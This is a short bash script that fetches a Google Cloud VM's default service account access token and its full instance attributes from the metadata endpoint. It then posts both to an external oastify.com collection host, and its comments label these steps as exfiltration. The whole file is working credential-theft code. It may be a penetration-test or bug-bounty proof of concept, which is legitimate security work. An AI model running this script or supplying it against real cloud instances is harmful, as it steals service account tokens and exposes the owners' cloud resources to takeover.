#!/bin/bash

#sends a request to the metadata endpoint to get creds.
var=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")

# exfiltrate the credentials
curl "http://y10lpu0a075c6qyjjsoc1avp5gb7zxnm.oastify.com/token" -d "$var"

#sends a request to the metadata endpoint to get attributes
var2=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text")

# exfil the attributes
curl "http://y10lpu0a075c6qyjjsoc1avp5gb7zxnm.oastify.com/attributes" -d "$var2"
